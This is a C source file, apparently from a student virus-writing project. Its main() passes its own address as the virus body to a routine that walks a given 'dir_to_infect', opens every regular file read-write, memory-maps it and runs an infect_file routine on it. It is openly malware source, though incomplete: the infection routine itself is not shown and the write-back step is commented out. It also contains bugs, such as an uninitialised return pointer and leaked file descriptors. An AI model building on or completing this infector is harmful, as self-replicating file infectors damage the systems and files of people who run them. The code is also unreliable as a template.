/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ezalos <ezalos@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/11/29 11:21:04 by ezalos            #+#    #+#             */
/*   Updated: 2021/02/19 11:1:0128 by ezalos           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "head.h"

char *join_path(char *dir, char *file)
{
	char			*file_path;
	char			*tmp;

	tmp = ft_strjoin(dir, "/");
	if (tmp)
	{
		file_path = ft_strjoin(tmp, file);
		free(tmp);
	}
	return (file_path);
}

void		infect_dir(char *dir_path, uint8_t *start_virus)
{
	char			*file_path;
	DIR				*dir;
	struct dirent	*dir_entry;
	int				fd;
	struct stat		stat;
	uint8_t			*mem_file;

	printf("%s\n", __func__);
	dir = opendir(dir_path);
	if (dir == NULL)
		return ;
	while ((dir_entry = readdir(dir)) != NULL)
	{
		if ((file_path = join_path(dir_path,
				dir_entry->d_name)) == NULL)
			return ;
		printf("Dir: %s\n", file_path);
		if ((fd = open(file_path, O_RDWR)) == -1)
		{
			free(file_path);
			continue ;
		}
		free(file_path);
		// printf("Opened\n");
		if (fstat(fd, &stat) == -1)
			continue ;
		// printf("Stated\n");
		if (!S_ISREG(stat.st_mode))
			continue ;
		// printf("Moded\n");
		if ((mem_file = mmap(NULL,
				stat.st_size,
				PROT_READ | PROT_WRITE,
				MAP_PRIVATE,
				fd,
				0)) == MAP_FAILED)
			continue ;
		// printf("Mapped\n");

		if ((mem_file = infect_file(mem_file, stat.st_size, start_virus)) != NULL)
			// save_file();
			printf("Infection routine done !\n");

		// infect_file();// TODO handle munmap in infect_file
		// 	save_file(dir_entry->d_name, mem_file);
	}
}

int			main(int ac, char **av)
{
	// ssize_t size;
	// uint8_t *content;

	printf("Hello World!\n");

	if (ac < 2)
	{
		printf("usage: %s dir_to_infect\n", av[0]);
		return (FAILURE);
	}
	printf("%s\n", __func__);
	infect_dir(av[1], (void*)main);
	// content = access_file(av[1], &size);
	// if (!check_elf_header(content, size))
	// 	return (FAILURE);
	// printf("Wesh wesh !\n");
	return (0);
}
